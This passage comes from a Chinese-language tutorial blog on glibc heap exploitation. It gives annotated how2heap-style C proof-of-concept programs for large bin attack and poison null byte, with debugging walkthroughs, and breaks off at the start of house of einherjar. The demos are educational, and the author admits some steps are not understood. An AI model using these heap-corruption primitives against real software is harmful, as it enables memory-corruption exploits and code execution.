alt="image-20210511170116006"></p><p>然后我们修改了victim的size和它的bk，bk改成了我们伪造的chunk，size这里只要改小就行，这是为什么呢？</p><p>此时我们依旧修改了victim的bk，本来unsorted bin中只有一个chunk，但是我们修改了它的bk后，它就被误以为有两个chunk，也就是我们的fake_chunk被系统认为链入到了unsorted bin中，但是unsorted bin是先进先出的，所以是从0x20的开始取，但是大小不够，所以会将0x20的放入small bin中(符合small  bin大小)，然后从下一个也就是我们伪造的fake chunk去取，此时就符合</p><p>但是这里有个疑问就是unsorted bin中不是一个chunk的话，应该是会把所有chunk都放入适合大小的bin后在从bin中去取，比如我认为这里应该都会放入small bin中，而不是只有0x20的放入，但是我调试看似乎只有它放了，我也不知道为什么</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513650097/0" alt="image-20210511171915008"></p><h2 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h2><p>程序先是在栈上定义了一个数组</p><p>随即分配了两个大小为0x100的chunk vitcim和chunk p1</p><p>紧接着释放了victim把他放进了unsorted bin中，之后在栈上伪造了一个fake chunk</p><p>最后修改了victim的Size和bk指针，将我们的fake chunk链入我们的unsorted bin中</p><p>此时我们再malloc一个合适大小的chunk就可以在我们的栈上malloc出来了</p><p>条件：</p><ol><li>两个chunk，其中一个只是防止与top chunk合并</li><li>一个放入victim中，修改size，修改bk为fake_chunk</li><li>栈上伪造一个chunk</li><li>malloc一个适合的chunk</li></ol><h1 id="0x09-large-bin-attack"><a href="#0x09-large-bin-attack" class="headerlink" title="0x09 large bin attack"></a>0x09 large bin attack</h1><h2 id="源代码-9"><a href="#源代码-9" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 本例以通过写一个大的无符号long型数值进入栈来演示large bin attack</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 在实际中，large bin attack也常常被用于更深层次的攻击，如覆写global_max_fast来为fastbin attack打辅助(为什么有一种看到了unsorted bin attack的错觉2333</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 我们要在栈上覆写的是stack_var1和stack_var2</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们有了第一个large chunk</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 然后申请一个fastbin chunk 来避免我们的第一个large chunk free的时候与下一个large chunk合并</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//现在是第二个large chunk</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//同理,防止第二个free的时候与下一个large chunk合并</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最后我们分配第三个large chunk</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 这个fastbin是为了防止和top chunk合并</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="comment">// 现在我们free掉第一个和第二个large chunks,此时他们会被插入到unsorted bin中</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)(p2 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="comment">// 此时,我们申请一个小于被释放的第一个large chunk的chunk</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">            <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">            <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">            <span class="string">&quot; [ %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="comment">// 现在我们free第三个large chunk</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)(p3 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在假设我们有一个漏洞可以覆写被free的第二个large chunk的size,bk,bk_nextsize指针</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">            <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 现在我们减少被free的第二个large chunk来逼迫malloc将被free的第三个large chunk插入到large bin freelist的头部</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">    <span class="comment">// 为了覆写栈上的值,我们将在stack_var1前将bk设位16bytes,并在stack_var2前将bk_nextsize设为32bytes        </span></span><br><span class="line">            <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">            <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 让我们再malloc一次,这样被释放的large chunk就被插入到large bin freelist了</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">    <span class="comment">//在这期间,我们的目标已经被改写        </span></span><br><span class="line">            <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(stack_var1 != <span class="number">0</span>);</span><br><span class="line">    assert(stack_var2 != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-8"><a href="#运行结果及调试-8" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>分配完六个chunk后的堆块结构</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13514630352/0" alt="image-20210511210104490"></p><p>释放了p1和p2之后</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13514634416/0" alt="image-20210511210205159"></p><p>此时我们再申请一个小的chunk，就会把第二个free的chunk放入large bin中</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13514656787/0" alt="image-20210511210746116"></p><p>并且发现我们的unsorted bin中的chunk是经过切割的</p><p>经过调试发现其实在申请小的chunk的时候，会将这两个chunk都放入large bin中(符合large bin大小)，然后去large bin中去取合适的chunk，此时合适的chunk就是第一个free掉的，将其切割后，剩余的就会进入到unsorted bin中，就会变成上面这样。</p><p>此时我们再free掉p3</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13514693470/0" alt="image-20210511211912928"></p><p>可以看到p3也进入了unsorted bin中，我们开始伪造p2</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13514702324/0" alt="image-20210511212136686"></p><p>我们先修改了p2的size为0x3f1，然后fd为0，fd-&gt;nextsize为0，bk为&amp;stack_var1 - 2，而bk-&gt;nextsize为&amp;stack_var2-4</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13514819900/0" alt="image-20210511215816634"></p><p>可以看到此时我们已经修改了stack_var1和stack_var2</p><h2 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h2><p>本例中,程序先是在栈上创建了两个变量stack_var1和stack_var2并赋初值为0,这两个变量就是即将要被覆写的变量</p><p>随后申请了一个large chunk p1,然后又申请了一个小chunk来避免后面的操作引发合并,之后又申请了一个large chunk p2,之后还是一个避免合并的小chunk,下面申请p3的操作类似</p><p>随后程序释放了p1,p2,此时两个chunk被链入unsorted bin中</p><p>之后为了将p2放入large bin,程序又申请了一个小chunk对p1进行切割,一部分还给用户,一部分继续放进unsorted bin中,然后系统将p2放入了large bin中</p><p>之后Free掉了p3,现在p3也在unsorted bin中</p><p>好了,现在程序伪造了p2的内容,将p2-&gt;bk_nextsize指向stack2-4,p2-&gt;bk指向stack1-2</p><p>再malloc一个小chunk,这个时候程序就会将p3放入large bin中,系统就会调用从unsorted bin中取出large bin的操作,将堆地址存入栈上的地址</p><p>条件：</p><ol><li>先想办法将放入一个chunk到large bin中</li><li>unsorted bin中有两个chunk，这样可以触发将一个chunk放入large bin(当然要满足large bin的大小)</li><li>此时malloc的时候就会将unsorted bin中的chunk放入到large bin中，放入large bin就会触发它的排序，所以排序就会试我们的攻击成功？</li><li>这里需要改大小，不改程序就会崩，改大了stack1就没改，不知道为什么后面再调调看吧</li></ol><h1 id="0x10-poison-null-bytes"><a href="#0x10-poison-null-bytes" class="headerlink" title="0x10 poison null bytes"></a>0x10 poison null bytes</h1><p>这种攻击方式需要在没有tcache上进行</p><h2 id="源代码-10"><a href="#源代码-10" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span>* a;</span><br><span class="line"><span class="keyword">uint8_t</span>* b;</span><br><span class="line"><span class="keyword">uint8_t</span>* c;</span><br><span class="line"><span class="keyword">uint8_t</span>* b1;</span><br><span class="line"><span class="keyword">uint8_t</span>* b2;</span><br><span class="line"><span class="keyword">uint8_t</span>* d;</span><br><span class="line"><span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">    <span class="comment">// 我们想溢出&#x27;a&#x27;的话，我们需要知道&#x27;a&#x27;的真实大小，因为舍入，&#x27;a&#x27;可能比0x100更大(我觉得这个舍入就是加了size,presize然后空间复用了一下</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line"><span class="string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// chunk size属性的最小有效字节不能是0x00，最小的也必须是0x10，因为chunk的size包括请求的量加上元数据所需的大小(也就是我们的size和pre_size然后空间复用</span></span><br><span class="line"><span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment"> * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment"> * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">// c我们分配了barrier,这样我们free c的时候就不会被合并到top chunk里了,这个burrier并不是必须的,只不过是为了减少可能产生的问题</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line"><span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在新版本的glibc中添加了新的check即: size==prev_next(next_chunk)</span></span><br><span class="line"><span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line"><span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line"><span class="comment">// 这个被新增的check要求我们允许b中有null指针而不仅仅是c   </span></span><br><span class="line">    <span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line"><span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line">    <span class="comment">// 在新版本的glibc中我们需要让我们更新的size包含b自身去pass &#x27;chunksize(P)!=prev_size(next_chunk(P))&#x27;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span></span><br><span class="line"><span class="string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);</span><br><span class="line"><span class="comment">// 我们将此位置设为0x200,因为0x200==(0x211&amp;0xff00)</span></span><br><span class="line">    <span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line">    <span class="comment">// 这个是b.size的值在被null字节覆盖之后的值  </span></span><br><span class="line">    <span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个技术通过覆盖一个free chunk的元数据来生效</span></span><br><span class="line"><span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 我们通过用一个null字节来溢出a来修改b的元数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个malloc将会在b上调用unlink</span></span><br><span class="line">     <span class="comment">// This malloc will result in a call to unlink on the chunk where b was.   </span></span><br><span class="line">     <span class="comment">//新增的chunk,如果没有像之前那样被正确处理,就会检测堆是否被损坏了                                  </span></span><br><span class="line">     <span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,                       </span></span><br><span class="line">     <span class="comment">// will detect the heap corruption now.                            </span></span><br><span class="line">     <span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where                                </span></span><br><span class="line">     <span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)               </span></span><br><span class="line">     <span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line">     <span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,</span><br><span class="line">*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b1: %p\n&quot;</span>,b1);</span><br><span class="line">    <span class="comment">// 现在我们malloc b1,他将会被放在b的地方,此时,c的prev_size将会被更新</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span></span><br><span class="line"><span class="string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span></span><br><span class="line"><span class="string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line"><span class="comment">// 我们malloc b2作为我们的攻击目标</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);</span><br><span class="line"><span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b2: %p\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(b2,<span class="string">&#x27;B&#x27;</span>,<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们释放b1和c,这将会合并b1和c(无视b2)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(b1);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"><span class="comment">// 现在我们malloc d来和b2重叠</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span></span><br><span class="line"><span class="string">&quot;for the clear explanation of this technique.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-9"><a href="#运行结果及调试-9" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>此时我们断在分配了a，b，c，barrier</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516493479/0" alt="image-20210512123452148"></p><p>然后我们修改了b+0x1f0位为0x200</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516503194/0" alt="image-20210512123736375"></p><p>然后此时我们释放chunk b</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516510930/0" alt="image-20210512124027482"></p><p>然后此时我们将b的size改为0x200，可以与上图对比</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516514191/0" alt="image-20210512124142621"></p><p>此时我们再次malloc的时候，因为b被视为free态，此时会调用unlink</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516529148/0" alt="image-20210512124710639"></p><p>此时的b1已经被放到了原本b的位置，然后我们再malloc b2</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516537157/0" alt="image-20210512125019648"></p><p>随后我们释放b1和c，程序会直接无视b2合并b1和c</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516740491/0" alt="image-20210512135642809"></p><p>此时我们将合并后的chunk申请回来作为d，此时d就会和b2发生overlapping</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516749332/0" alt="image-20210512135925294"></p><p>然后我们给d赋值，b2就会被修改</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516753875/0" alt="image-20210512140042490"></p><h2 id="总结-10"><a href="#总结-10" class="headerlink" title="总结"></a>总结</h2><p>程序首先malloc了a(0x100),b(0x200),c(0x100),barrier(0x100)四个chunk</p><p>随后为了绕过check,程序将b+0x1f0的位置设为了0x200</p><p>紧接着程序Free掉了b并将b的size设为了0x200(原本是0x211)</p><p>随后程序malloc了b1(0x100),因为b是被Free掉的,因此b1就会被放到b的部分,而b做了一个unlink,一分两半</p><p>随后程序又malloc了b2(0x80),b2依旧是所属b的</p><p>之后程序为了方便看效果,将b2填满了’B’</p><p>最后程序free掉了b1和c,因为c的pre_size为0x210,因此程序就会将b1和c合并,因为b2位于b1和c之间,虽然b2其实并未被free,但是我们已经可以申请到b2的内存了</p><p>此时程序malloc了d(0x300),系统就会把b1和c合并后的大chunk给用户,此时d就申请到了原本b开始到b+0x310结束的内存,将b2包了起来</p><p>构成了overlapping,此时给d赋值为”D”,可以看到b2也被覆盖成了”D” :)</p><h1 id="0x11-house-of-einherjar"><a href="#0x11-house-of-einherjar" class="headerlink" title="0x11 house of einherjar"></a>0x11 house of einherjar</h1><p>这个技术是利用free的后向合并把top chunk设为我们伪造的chunk地址来强制malloc分配到我们伪造的地址，并且这个是在glibc2.23的版本测试使用，利用off-by-null</p><h2 id="源代码-11"><a href="#源代码-11" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span 